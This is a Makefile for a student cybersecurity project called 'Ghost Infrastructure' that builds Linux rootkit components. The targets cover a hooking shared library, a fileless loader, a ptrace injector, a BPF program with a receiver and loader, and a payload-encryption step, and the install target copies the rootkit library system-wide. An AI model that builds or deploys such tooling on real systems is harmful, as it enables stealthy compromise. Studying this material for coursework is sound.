# Ghost Infrastructure - Makefile
# Projet de spécialisation cybersécurité 42

CC      ?= gcc
CFLAGS  ?= -Wall -Wextra -Werror -pedantic -std=c11
LDFLAGS ?= -ldl -lpthread

# Directories
LIBBPF_INC ?= ./libbpf/install/usr/include
LIBBPF_LIB ?= ./libbpf/build

# Targets
ALL_TARGETS    ?= hijack.so evador injector receiver
BPF_TARGETS    ?= ghost.bpf.o
ALL            ?= $(ALL_TARGETS) $(BPF_TARGETS)

# Default rule
all: $(ALL)

# ==================== SHARED LIBRARY ====================

# Full rootkit version (with all hooks)
hijack.so: hijack.c config.h
	$(CC) $(CFLAGS) -fPIC -shared -DGHOST_FULL_ROOTKIT -o $@ $< $(LDFLAGS)

# Light version (target process detection only)
ghost_lib.so: ghost_lib.c config.h
	$(CC) $(CFLAGS) -fPIC -shared -o $@ $< $(LDFLAGS)

# ==================== STANDALONE BINARIES ====================

# Fileless loader
evador: evador.c
	$(CC) $(CFLAGS) -o $@ $< -ldl

# ptrace injector
injector: injector.c
	$(CC) $(CFLAGS) -o $@ $< -ldl

# BPF receiver
receiver: receiver.c config.h
	$(CC) $(CFLAGS) -o $@ $<

# ==================== BPF ====================

# Compile BPF object (requires clang + llvm)
ghost.bpf.o: ghost.bpf.c
	clang -O2 -target bpf \
		-I$(LIBBPF_INC) \
		-c $< -o $@

# BPF loader (requires libbpf)
loader: loader.c config.h
	$(CC) $(CFLAGS) -o $@ $< \
		-I$(LIBBPF_INC) \
		-L$(LIBBPF_LIB) \
		-l:libbpf.a -lelf -lz

# ==================== HELPERS ====================

# Setup libbpf (run once)
setup-libbpf:
	@if [ ! -d "libbpf" ]; then \
		git clone https://github.com/libbpf/libbpf.git; \
	fi
	cd libbpf/src && make OBJDIR=../build DESTDIR=../install install

# Clean all build artifacts
clean:
	rm -f *.o *.so evador injector receiver ghost.bpf.o
	rm -f /tmp/.ghost_*
	rm -f /tmp/.sys_core

# Full clean including libbpf
distclean: clean
	rm -rf libbpf/build libbpf/install

# Install (requires root for system-wide)
install: hijack.so
	install -m 0755 hijack.so /usr/local/lib/
	ldconfig

# Uninstall (requires root)
uninstall:
	rm -f /usr/local/lib/hijack.so
	ldconfig

# ==================== TESTING ====================

# Quick test build
test-build: hijack.so evador injector receiver
	@echo "[+] Build successful"

# ==================== PYTHON ====================

# Install Python dependencies
install-python:
	pip install cryptography

# Encrypt payload
encrypt: encrypt_payload.py
	python3 $< hijack.so

# ==================== USAGE ====================

help:
	@echo "Ghost Infrastructure - Makefile"
	@echo ""
	@echo "Targets:"
	@echo "  all              Build all targets (default)"
	@echo "  hijack.so        Build full rootkit shared library"
	@echo "  ghost_lib.so     Build light version (target detection only)"
	@echo "  evador           Build fileless loader"
	@echo "  injector         Build ptrace injector"
	@echo "  receiver         Build BPF receiver"
	@echo "  ghost.bpf.o      Compile BPF program (requires clang)"
	@echo "  loader           Build BPF loader (requires libbpf)"
	@echo ""
	@echo "Setup:"
	@echo "  setup-libbpf     Clone and build libbpf"
	@echo "  install-python   Install Python dependencies"
	@echo ""
	@echo "Cleaning:"
	@echo "  clean            Remove build artifacts"
	@echo "  distclean        Remove all generated files"
	@echo ""
	@echo "Examples:"
	@echo "  make hijack.so"
	@echo "  make evador injector"
	@echo "  make clean"

.PHONY: all clean distclean install uninstall test-build setup-libbpf encrypt help
